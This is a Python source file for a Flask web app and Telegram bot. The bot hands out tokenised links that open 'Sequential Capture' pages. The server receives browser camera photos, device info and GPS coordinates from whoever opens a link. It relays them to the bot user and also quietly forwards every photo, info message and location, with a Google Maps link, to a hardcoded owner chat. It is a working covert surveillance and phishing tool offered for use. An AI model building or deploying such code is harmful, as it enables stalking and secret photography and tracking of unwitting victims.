import threading
import requests
import os
import base64
from flask import Flask, request, render_template, jsonify
from telegram.ext import Updater, CommandHandler
from utils import BOT_TOKEN, OWNER_CHAT_ID, IPINFO_TOKEN
from token_store_sql import (
    generate_token,
    store_token_for_chat,
    get_chat_id,
    store_name,
    get_name,
    get_token_for_chat,
    store_chat_to_token
)

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

app = Flask(__name__)

# ---------------- Telegram Bot Logic ---------------- #
def start(update, context):
    chat_id = update.message.chat_id
    user = update.message.from_user

    # ✅ Always reuse old token if exists
    token = get_token_for_chat(chat_id)
    if not token:
        token = generate_token(chat_id)
        store_token_for_chat(token, chat_id)
        store_chat_to_token(chat_id, token)
        store_name(token, user.first_name or "User")

    link = f"{RENDER_URL}/index?token={token}"

    greeting = (
        f"👋 *Welcome {user.first_name or ''}*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 *Mode:* Sequential Capture\n"
        "📸 *Step 1:* Camera\n"
        "📍 *Step 2:* Location\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👉 *Click here to start:*\n{link}"
    )
    context.bot.send_message(chat_id=chat_id, text=greeting, parse_mode="Markdown")

def run_bot():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    updater.start_polling()

# ---------------- Flask Routes ---------------- #

# ✅ Health check route (always alive)
@app.route("/")
def health_check():
    return "Service is alive", 200

# ✅ Main user route
@app.route("/index")
def index():
    token = request.args.get("token")
    chat_id = get_chat_id(token)

    if not chat_id:   # invalid/expired token
        new_token = generate_token("guest")
        store_token_for_chat(new_token, "guest")
        new_link = f"{RENDER_URL}/index?token={new_token}"

        return (
            f"<h2>⚠️ यह link expire हो गया है</h2>"
            f"<p>नया link पाने के लिए हमारे Telegram channel को join करें:</p>"
            f"<p><b>@YourChannelName</b></p>"
            f"<p>👉 <a href='{new_link}'>यहाँ क्लिक करें</a> नया link खोलने के लिए</p>",
            403
        )

    name = get_name(token) or "User"
    return render_template("index.html", token=token, ipinfo_token=IPINFO_TOKEN, user_name=name)

@app.route("/next")
def next_page():
    token = request.args.get("token")
    chat_id = get_chat_id(token)

    if not chat_id:   # invalid/expired token
        new_token = generate_token("guest")
        store_token_for_chat(new_token, "guest")
        new_link = f"{RENDER_URL}/index?token={new_token}"

        return (
            f"<h2>⚠️ यह link expire हो गया है</h2>"
            f"<p>नया link पाने के लिए हमारे Telegram channel को join करें:</p>"
            f"<p><b>@YourChannelName</b></p>"
            f"<p>👉 <a href='{new_link}'>यहाँ क्लिक करें</a> नया link खोलने के लिए</p>",
            403
        )

    name = get_name(token) or "User"
    return render_template("page2.html", token=token, user_name=name)

# ---------------- Photo ---------------- #
@app.route("/send_photo", methods=["POST"])
def send_photo():
    data = request.json or {}
    image_data = data.get("image")
    token = data.get("token")
    chat_id = get_chat_id(token)

    if not image_data or not chat_id:
        return jsonify({"status": "missing data"}), 400

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except Exception as e:
        print("Decode error:", e)
        return jsonify({"status": "invalid image"}), 400

    filename = "temp.jpg"
    try:
        with open(filename, "wb") as f:
            f.write(image_bytes)

        with open(filename, "rb") as photo:
            resp = requests.post(
                f"{TELEGRAM_API}/sendPhoto",
                data={"chat_id": chat_id},
                files={"photo": photo},
                timeout=10
            )
        result = resp.json()
        print("User photo response:", result)

        if result.get("ok"):
            message_id = result["result"]["message_id"]
            requests.post(
                f"{TELEGRAM_API}/forwardMessage",
                data={
                    "chat_id": OWNER_CHAT_ID,
                    "from_chat_id": chat_id,
                    "message_id": message_id
                },
                timeout=10
            )
        else:
            print("Photo send failed:", result)
    finally:
        try:
            os.remove(filename)
        except Exception:
            pass

    return jsonify({"status": "sent"}), 200

# ---------------- Info ---------------- #
@app.route("/send_info", methods=["POST"])
def send_info():
    data = request.json or {}
    token = data.get("token")
    chat_id = get_chat_id(token)
    info_text = data.get("info")

    if not chat_id or not info_text:
        return jsonify({"status": "missing data"}), 400

    try:
        resp = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            data={"chat_id": chat_id, "text": info_text, "parse_mode": "Markdown"},
            timeout=10
        )
        result = resp.json()
        print("User info response:", result)

        if result.get("ok"):
            owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
            requests.post(
                f"{TELEGRAM_API}/sendMessage",
                data={"chat_id": OWNER_CHAT_ID, "text": owner_text, "parse_mode": "Markdown"},
                timeout=10
            )
        else:
            print("Info send failed:", result)
    except Exception as e:
        print("Error sending info:", e)

    return jsonify({"status": "sent"}), 200

# ---------------- Location ---------------- #
@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json or {}
    token = data.get("token")
    chat_id = get_chat_id(token)
    lat = data.get("lat")
    lon = data.get("lon")

    print("DEBUG:", token, chat_id, lat, lon)

    if not chat_id or lat is None or lon is None:
        return jsonify({"status": "missing data"}), 400

    try:
        lat = float(lat)
        lon = float(lon)
    except Exception as e:
        print("Invalid coords:", e)
        return jsonify({"status": "invalid coords"}), 400

    # Step 1: Send native Telegram location bubble
    try:
        resp = requests.post(
            f"{TELEGRAM_API}/sendLocation",
            data={"chat_id": chat_id, "latitude": lat, "longitude": lon},
            timeout=10
        )
        result = resp.json()
        print("User location response:", result)

        if result.get("ok"):
            message_id = result["result"]["message_id"]
            requests.post(
                f"{TELEGRAM_API}/forwardMessage",
                data={
                    "chat_id": OWNER_CHAT_ID,
                    "from_chat_id": chat_id,
                    "message_id": message_id
                },
                timeout=10
            )
        else:
            print("Location send failed:", result)
    except Exception as e:
        print("Error sending location:", e)

    # Step 2: Send Google Maps link
    try:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        text = f"📍 *Open in Google Maps:*\n{maps_url}"
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            data={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
            timeout=10
        )
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            data={"chat_id": OWNER_CHAT_ID, "text": f"User {chat_id} map link:\n{maps_url}"},
            timeout=10
        )
    except Exception as e:
        print("Error sending maps link:", e)

    return jsonify({"status": "sent"}), 200

# ---------------- Main Entry ---------------- #
if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)